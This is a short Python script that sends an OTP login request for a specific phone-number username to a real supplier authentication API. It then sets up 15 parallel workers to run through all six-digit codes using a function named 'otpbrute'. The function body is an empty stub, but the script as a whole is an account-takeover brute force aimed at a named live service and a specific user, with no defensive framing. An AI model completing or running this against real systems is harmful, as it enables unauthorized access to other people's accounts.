import requests
import json
from joblib import Parallel,delayed


obj = '{"username":"9811103138", "password": "", "otp":"123456", "source":0}'
obj = json.loads(obj)
outp = requests.post('https://supplierapi.moglix.com/auth/otpLogin', json=obj)
print(outp.text)
a = json.loads(outp.text)
print(type(a['success']))

def otpbrute(num):
    # print(num)
    pass

Parallel(n_jobs=15)(delayed(otpbrute) (str(t).zfill(6)) for t in range(100000))